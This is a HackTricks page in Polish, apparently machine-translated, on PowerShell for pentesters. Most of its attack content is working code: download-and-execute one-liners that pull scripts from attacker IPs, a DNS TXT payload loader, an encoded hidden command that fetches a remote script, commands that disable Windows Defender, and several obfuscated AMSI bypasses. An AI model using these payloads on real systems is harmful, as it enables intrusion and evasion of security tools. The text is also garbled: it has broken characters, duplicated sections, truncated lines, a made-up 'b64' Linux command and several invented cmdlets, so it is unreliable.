# Podstawy PowerShell dla pentester贸w

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>

## Domylne lokalizacje PowerShell
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## Podstawowe polecenia PS do rozpoczcia

Here are some basic PowerShell commands that can help you get started:

Oto kilka podstawowych polece PowerShell, kt贸re mog pom贸c Ci rozpocz:

### Get-Command

Use the `Get-Command` command to retrieve a list of available commands in PowerShell.

U偶yj polecenia `Get-Command`, aby wywietli list dostpnych polece w PowerShell.

```powershell
Get-Command
```

### Get-Help

If you need help with a specific command, use the `Get-Help` command followed by the command name.

Jeli potrzebujesz pomocy dotyczcej konkretnego polecenia, u偶yj polecenia `Get-Help`, a nastpnie podaj nazw polecenia.

```powershell
Get-Help <command_name>
```

### Get-Process

To retrieve a list of running processes, use the `Get-Process` command.

Aby wywietli list uruchomionych proces贸w, u偶yj polecenia `Get-Process`.

```powershell
Get-Process
```

### Get-Service

To retrieve a list of installed services, use the `Get-Service` command.

Aby wywietli list zainstalowanych usug, u偶yj polecenia `Get-Service`.

```powershell
Get-Service
```

### Get-EventLog

To retrieve event logs, use the `Get-EventLog` command followed by the log name.

Aby wywietli dzienniki zdarze, u偶yj polecenia `Get-EventLog`, a nastpnie podaj nazw dziennika.

```powershell
Get-EventLog -LogName <log_name>
```

### Get-WmiObject

To retrieve information from WMI (Windows Management Instrumentation), use the `Get-WmiObject` command followed by the WMI class name.

Aby uzyska informacje z WMI (Windows Management Instrumentation), u偶yj polecenia `Get-WmiObject`, a nastpnie podaj nazw klasy WMI.

```powershell
Get-WmiObject -Class <class_name>
```

### Get-ChildItem

To list files and directories in a specific location, use the `Get-ChildItem` command followed by the path.

Aby wywietli pliki i katalogi w okrelonym miejscu, u偶yj polecenia `Get-ChildItem`, a nastpnie podaj cie偶k.

```powershell
Get-ChildItem -Path <path>
```

These are just a few examples of basic PowerShell commands. As you explore more, you will discover a wide range of powerful capabilities that PowerShell offers.

To tylko kilka przykad贸w podstawowych polece PowerShell. W miar eksploracji odkryjesz szeroki zakres pot偶nych mo偶liwoci, kt贸re oferuje PowerShell.
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## Pobierz i Uruchom

To jest prosty skrypt PowerShell, kt贸ry mo偶na u偶y do pobrania i uruchomienia pliku z internetu. Skrypt ten jest przydatny w przypadku, gdy chcesz zdalnie pobra i uruchomi plik na komputerze docelowym.

```powershell
$Url = "https://example.com/file.exe"
$Output = "C:\Temp\file.exe"

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($Url, $Output)

Start-Process -FilePath $Output
```

Aby u偶y tego skryptu, wystarczy zmieni wartoci zmiennych `$Url` i `$Output` na odpowiednie wartoci. `$Url` powinien zawiera peny adres URL pliku, kt贸ry chcesz pobra, a `$Output` powinien zawiera cie偶k docelow, gdzie chcesz zapisa pobrany plik.

Po uruchomieniu skryptu, plik zostanie pobrany z podanego adresu URL i zapisany w okrelonym miejscu. Nastpnie skrypt uruchomi ten plik na komputerze docelowym.

Pamitaj, 偶e ten skrypt mo偶e by u偶ywany w celach legalnych, takich jak testowanie bezpieczestwa lub zarzdzanie zdalnymi komputerami. U偶ywanie go w nielegalny spos贸b jest niezgodne z prawem i mo偶e prowadzi do konsekwencji prawnych.
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### Pobierz i wykonaj w tle z pominiciem AMSI

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Pobierz plik
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)

# Wykonaj plik w tle z pominiciem AMSI
$Bytes = [System.IO.File]::ReadAllBytes($Output)
$EncodedCommand = [System.Convert]::ToBase64String($Bytes)
$Command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCommand))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
powershell -exec bypass -enc $EncodedCommand
```

Ten skrypt PowerShell pobiera plik wykonywalny z podanego adresu URL i nastpnie wykonuje go w tle, pomijajc skanowanie AMSI.

```powershell
$URL = "http://example.com/malicious_payload.exe"
$Output = "C:\Temp\malicious_payload.exe"

# Download the file
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)

# Execute the file in the background with AMSI bypass
$Bytes = [System.IO.File]::ReadAllBytes($Output)
$EncodedCommand = [System.Convert]::ToBase64String($Bytes)
$Command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCommand))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
powershell -exec bypass -enc $EncodedCommand
```

This PowerShell script downloads an executable file from the specified URL and then executes it in the background, bypassing AMSI scanning.
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### U偶ywanie b64 w systemie Linux

The `b64` command in Linux is used to encode or decode data in Base64 format. It is a useful tool for manipulating and transferring data in a text-based format. Here are some examples of how to use the `b64` command:

#### Encoding data

To encode data using Base64, you can use the following command:

```
$ echo "Hello, World!" | b64
```

This will output the encoded data:

```
SGVsbG8sIFdvcmxkIQ==
```

#### Decoding data

To decode Base64-encoded data, you can use the following command:

```
$ echo "SGVsbG8sIFdvcmxkIQ==" | b64 -d
```

This will output the decoded data:

```
Hello, World!
```

#### Encoding a file

You can also encode the contents of a file using Base64. For example, to encode the contents of a file named `file.txt`, you can use the following command:

```
$ b64 file.txt
```

This will output the encoded data to the console.

#### Decoding a file

Similarly, you can decode the contents of a Base64-encoded file. For example, to decode the contents of a file named `encoded.txt`, you can use the following command:

```
$ b64 -d encoded.txt
```

This will output the decoded data to the console.

The `b64` command is a handy tool for working with Base64-encoded data in Linux. It can be used in various scenarios, such as encoding or decoding data, or working with files.
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## Pobierz

### System.Net.WebClient

Aby pobra plik za pomoc klasy `System.Net.WebClient`, wykonaj nastpujcy kod:

```powershell
$webClient = New-Object System.Net.WebClient
$url = "adres_url_pliku"
$destination = "cie偶ka_docelowa"
$webClient.DownloadFile($url, $destination)
```

Gdzie:
- `adres_url_pliku` to adres URL pliku, kt贸ry chcesz pobra.
- `cie偶ka_docelowa` to cie偶ka, w kt贸rej chcesz zapisa pobrany plik.

Przykad u偶ycia:

```powershell
$webClient = New-Object System.Net.WebClient
$url = "https://www.example.com/plik.txt"
$destination = "C:\Users\U偶ytkownik\Documents\plik.txt"
$webClient.DownloadFile($url, $destination)
```

Ten kod pobierze plik `plik.txt` ze strony `https://www.example.com` i zapisze go w lokalizacji `C:\Users\U偶ytkownik\Documents\plik.txt`.
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

Invoke-WebRequest is a cmdlet in PowerShell that allows you to send HTTP and HTTPS requests to a web page or web service. It can be used for various purposes, such as downloading files, interacting with web APIs, and scraping web content.

To use Invoke-WebRequest, you need to provide the URL of the web page or web service you want to interact with. You can also specify additional parameters, such as headers, cookies, and authentication credentials.

Here is an example of how to use Invoke-WebRequest to download a file from a web server:

```powershell
Invoke-WebRequest -Uri "https://example.com/file.txt" -OutFile "C:\path\to\save\file.txt"
```

In this example, the `-Uri` parameter specifies the URL of the file you want to download, and the `-OutFile` parameter specifies the path where you want to save the downloaded file.

You can also use Invoke-WebRequest to interact with web APIs by sending HTTP requests with specific headers and parameters. For example, you can send a POST request with JSON data to a web API:

```powershell
$headers = @{
    "Content-Type" = "application/json"
}

$body = @{
    "name" = "John Doe"
    "email" = "johndoe@example.com"
} | ConvertTo-Json

Invoke-WebRequest -Uri "https://api.example.com/users" -Method Post -Headers $headers -Body $body
```

In this example, the `-Method` parameter specifies the HTTP method (POST in this case), the `-Headers` parameter specifies the request headers, and the `-Body` parameter specifies the request body.

Invoke-WebRequest is a powerful cmdlet that can be used for various web-related tasks in PowerShell. It provides a convenient way to interact with web pages, web services, and web APIs.
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget to narzdzie wiersza polece, kt贸re umo偶liwia pobieranie plik贸w z sieci. Mo偶e by u偶ywane do pobierania plik贸w z serwer贸w HTTP, HTTPS i FTP. Wget jest czsto u偶ywany przez pentester贸w do pobierania plik贸w z celu przeprowadzenia analizy i test贸w penetracyjnych.

#### Skadnia

```
wget [opcje] [adres URL]
```

#### Przykady u偶ycia

Pobierz plik z serwera HTTP:

```
wget http://example.com/plik.txt
```

Pobierz plik z serwera HTTPS:

```
wget https://example.com/plik.txt
```

Pobierz plik z serwera FTP:

```
wget ftp://example.com/plik.txt
```

#### Opcje

- `-O <nazwa_pliku>`: Okrela nazw, pod jak zostanie zapisany pobrany plik.
- `-P <cie偶ka>`: Okrela cie偶k, do kt贸rej zostanie zapisany pobrany plik.
- `-r`: Rekursywnie pobiera wszystkie pliki z podkatalog贸w.
- `-np`: Nie przechodzi do katalog贸w nadrzdnych podczas rekursywnego pobierania.
- `-nc`: Nie pobiera pliku, jeli ju偶 istnieje.
- `-nv`: Wycza wywietlanie komunikat贸w o postpie pobierania.
- `-q`: Wycza wywietlanie jakichkolwiek komunikat贸w.
- `-U <nazwa_agenta>`: Okrela nazw agenta u偶ytkownika, kt贸ra zostanie wysana do serwera podczas pobierania.

Wicej informacji na temat dostpnych opcji mo偶na znale藕 w dokumentacji Wget.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransfer to usuga w systemie Windows, kt贸ra umo偶liwia przesyanie plik贸w midzy komputerami za pomoc protokou HTTP lub HTTPS. Jest to przydatne narzdzie dla pentester贸w, kt贸rzy chc przenosi pliki w trakcie test贸w penetracyjnych.

Aby rozpocz transfer pliku za pomoc BitsTransfer, mo偶na u偶y polecenia `Start-BitsTransfer`. Polecenie to wymaga podania 藕r贸dowego i docelowego adresu URL, a tak偶e lokalizacji, w kt贸rej ma zosta zapisany plik.

Przykad u偶ycia polecenia `Start-BitsTransfer`:

```powershell
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\Temp\file.txt"
```

Polecenie to rozpocznie transfer pliku `file.txt` z adresu URL `http://example.com/file.txt` i zapisze go w lokalizacji `C:\Temp\file.txt` na komputerze docelowym.

BitsTransfer oferuje r贸wnie偶 inne przydatne funkcje, takie jak wznawianie przerwanych transfer贸w, monitorowanie postpu transferu i zarzdzanie transferami w tle.

Aby uzyska wicej informacji na temat BitsTransfer i dostpnych polece, mo偶na u偶y polecenia `Get-Help Start-BitsTransfer` w konsoli PowerShell.
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

W systemie Kali Linux mo偶emy u偶ywa polecenia `base64` do kodowania i dekodowania danych w formacie Base64. Mo偶e to by przydatne podczas pentestowania, gdy chcemy ukry nasze polecenia przed wykryciem.

Aby zakodowa dane za pomoc Base64 w Kali Linux, mo偶emy u偶y nastpujcego polecenia:

```bash
echo -n "Dane do zakodowania" | base64
```

Aby zdekodowa dane zakodowane w formacie Base64, mo偶emy u偶y polecenia:

```bash
echo -n "Dane do zdekodowania" | base64 -d
```

W przypadku pentestowania system贸w Windows mo偶emy u偶y parametru `-EncodedCommand` w PowerShell do uruchamiania polece zaszyfrowanych w formacie Base64. Mo偶e to pom贸c w unikniciu wykrycia przez systemy antywirusowe.

Aby uruchomi zaszyfrowane polecenie w PowerShell, mo偶emy u偶y nastpujcej skadni:

```powershell
powershell.exe -EncodedCommand "Zaszyfrowane polecenie w formacie Base64"
```

Pamitaj, 偶e polecenie musi by zakodowane w formacie Base64 przed u偶yciem parametru `-EncodedCommand`.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [Polityka wykonywania](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [Ograniczony jzyk](broken-reference/)

## [Polityka AppLocker](broken-reference/)

## Wcz WinRM (Zdalne PS)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Wyczanie Defendera

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### Bypass AMSI

**`amsi.dll`** jest **adowany** do twojego procesu i ma niezbdne **eksporty**, aby ka偶da aplikacja z nim wsp贸pracowa. Poniewa偶 jest adowany do przestrzeni pamici procesu, kt贸ry **kontrolujesz**, mo偶esz zmieni jego zachowanie przez **nadpisanie instrukcji w pamici**. Sprawia to, 偶e nie wykrywa niczego.

Dlatego celem bypass贸w AMSI jest **nadpisanie instrukcji tej DLL w pamici, aby wykrywanie byo bezu偶yteczne**.

Strona internetowa generujca bypassy AMSI: [**https://amsi.fail/**](https://amsi.fail/)
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
### AMSI Bypass 2 - Podpinanie wywoa zarzdzanych API

Sprawd藕 [**ten post, aby uzyska szczeg贸owe informacje i kod**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/). Wprowadzenie:

Ta nowa technika polega na podpinaniu wywoa API metod .NET. Okazuje si, 偶e metody .NET musz zosta skompilowane do instrukcji maszynowych w pamici, kt贸re wygldaj bardzo podobnie do metod natywnych. Te skompilowane metody mog by podpinane, aby zmieni przepyw sterowania programu.

Kroki wykonywania podpinania wywoa API metod .NET to:

1. Zidentyfikuj docelow metod do podpicia
2. Zdefiniuj metod o takim samym prototypie funkcji jak docelowa
3. U偶yj refleksji, aby znale藕 metody
4. Upewnij si, 偶e ka偶da metoda zostaa skompilowana
5. Znajd藕 lokalizacj ka偶dej metody w pamici
6. Nadpisz docelow metod instrukcjami wskazujcymi na nasz zoliw metod

### AMSI Bypass 3 - Uprawnienia SeDebug

[Za pomoc tego przewodnika i kodu](https://github.com/MzHmO/DebugAmsi) mo偶esz zobaczy, jak przy wystarczajcych uprawnieniach do debugowania proces贸w mo偶na uruchomi proces powershell.exe, go debugowa, monitorowa, kiedy adowana jest biblioteka `amsi.dll` i j wyczy.

### AMSI Bypass - Wicej zasob贸w

+ [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+ [Amsi Bypass na Windows 11 w 2023 roku](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6)  [Github](https://github.com/senzee1984/Amsi_Bypass_In_2023)

## Historia PS
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
## Znajd藕 nowsze pliki

Opcje: `CreationTime`, `CreationTimeUtc`, `LastAccessTime`, `LastAccessTimeUtc`, `LastWriteTime`, `LastWriteTimeUtc`
```powershell
# LastAccessTime:
(gci C:\ -r | sort -Descending LastAccessTime | select -first 100) | Select-Object -Property LastAccessTime,FullName

# LastWriteTime:
(gci C:\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,FullName
```
## Uzyskaj uprawnienia

Aby uzyska informacje na temat uprawnie u偶ytkownik贸w w systemie Windows, mo偶na u偶y nastpujcych polece PowerShell:

### Polecenie Get-ACL

Polecenie `Get-ACL` pozwala na pobranie listy uprawnie dla okrelonego obiektu, takiego jak plik, folder lub rejestr. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ACL -Path C:\Folder
```

### Polecenie Get-Acl | Format-List

Polecenie `Get-ACL` mo偶na poczy z poleceniem `Format-List`, aby uzyska bardziej szczeg贸owe informacje na temat uprawnie. Przykad u偶ycia:

```powershell
Get-ACL -Path C:\Folder | Format-List
```

### Polecenie Get-NTFSAccess

Polecenie `Get-NTFSAccess` pozwala na pobranie uprawnie NTFS dla okrelonego obiektu. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-NTFSAccess -Path C:\Folder
```

### Polecenie Get-EffectiveAccess

Polecenie `Get-EffectiveAccess` pozwala na sprawdzenie efektywnych uprawnie dla okrelonego u偶ytkownika w systemie Windows. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-EffectiveAccess -Identity DOMAIN\Username -Path C:\Folder
```

### Polecenie Get-ProcessTokenPrivilege

Polecenie `Get-ProcessTokenPrivilege` pozwala na pobranie informacji o uprawnieniach tokena procesu. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ProcessTokenPrivilege -ProcessId 1234
```

### Polecenie Get-ServicePermission

Polecenie `Get-ServicePermission` pozwala na pobranie uprawnie dla okrelonej usugi systemowej. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ServicePermission -ServiceName ServiceName
```

### Polecenie Get-RegistryKeyPermission

Polecenie `Get-RegistryKeyPermission` pozwala na pobranie uprawnie dla okrelonego klucza rejestru. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-RegistryKeyPermission -KeyPath HKLM:\Software\Microsoft
```

### Polecenie Get-SharePermission

Polecenie `Get-SharePermission` pozwala na pobranie uprawnie dla okrelonego udziau sieciowego. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-SharePermission -Name ShareName
```

### Polecenie Get-ADUser

Polecenie `Get-ADUser` pozwala na pobranie informacji o u偶ytkownikach z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADUser -Identity Username
```

### Polecenie Get-ADGroup

Polecenie `Get-ADGroup` pozwala na pobranie informacji o grupach z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADGroup -Identity GroupName
```

### Polecenie Get-ADComputer

Polecenie `Get-ADComputer` pozwala na pobranie informacji o komputerach z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADComputer -Identity ComputerName
```

### Polecenie Get-ADObject

Polecenie `Get-ADObject` pozwala na pobranie informacji o obiektach z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADObject -Identity ObjectName
```

### Polecenie Get-ADDomain

Polecenie `Get-ADDomain` pozwala na pobranie informacji o domenie z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADDomain
```

### Polecenie Get-ADForest

Polecenie `Get-ADForest` pozwala na pobranie informacji o lesie z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADForest
```

### Polecenie Get-ADTrust

Polecenie `Get-ADTrust` pozwala na pobranie informacji o zaufaniu z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADTrust
```

### Polecenie Get-ADDomainController

Polecenie `Get-ADDomainController` pozwala na pobranie informacji o kontrolerach domeny z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADDomainController
```

### Polecenie Get-ADReplicationSite

Polecenie `Get-ADReplicationSite` pozwala na pobranie informacji o witrynach replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationSite
```

### Polecenie Get-ADReplicationSubnet

Polecenie `Get-ADReplicationSubnet` pozwala na pobranie informacji o podsieciach replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationSubnet
```

### Polecenie Get-ADReplicationConnection

Polecenie `Get-ADReplicationConnection` pozwala na pobranie informacji o poczeniach replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationConnection
```

### Polecenie Get-ADReplicationPartnerMetadata

Polecenie `Get-ADReplicationPartnerMetadata` pozwala na pobranie metadanych partnera replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationPartnerMetadata
```

### Polecenie Get-ADReplicationAttributeMetadata

Polecenie `Get-ADReplicationAttributeMetadata` pozwala na pobranie metadanych atrybutu replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationAttributeMetadata
```

### Polecenie Get-ADReplicationUpToDatenessVectorTable

Polecenie `Get-ADReplicationUpToDatenessVectorTable` pozwala na pobranie tabeli wektor贸w aktualnoci replikacji z Active Directory. Mo偶na je u偶y w nastpujcy spos贸b:

```powershell
Get-ADReplicationUpToDatenessVectorTable
```

### Polecenie Get-ADReplicationUpToDatenessVectorTablePartition

